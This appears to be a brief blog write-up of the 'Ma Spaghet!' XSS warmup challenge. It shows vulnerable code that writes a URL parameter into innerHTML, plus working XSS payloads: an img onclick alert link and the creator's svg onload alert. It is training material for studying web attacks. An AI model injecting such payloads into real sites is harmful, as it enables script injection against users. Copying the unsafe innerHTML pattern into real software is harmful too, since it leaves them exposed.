---
title: '[XSSG] Ma Spaghet!' 
date: 2022-04-29 
categories: [Others, XSSgame]
tags: [easy, warmups, xss, challenge]
permalink: /:categories/:title
---

#### Challenge

This is the script that violates the web

```html
<!-- Challenge -->
<h2 id="spaghet"></h2>
<script>
    spaghet.innerHTML = (new URL(location).searchParams.get('somebody') || "Somebody") + " Toucha Ma Spaghet!"
</script>
```

#### Solution

We have only to add a simple XSS, with *img* and the option *alt* we display something in the website and for execute some *js* we use onclick or onmouseover function to run the code

[Somebody Toucha Ma Spaghet!](https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=%3Cimg%20alt=%27click%27%20onclick=alert(%27win%27)%3E)

#### Creator solution

The solution given by the creator of the game is as follows

`<svg onload=alert(1337)>`
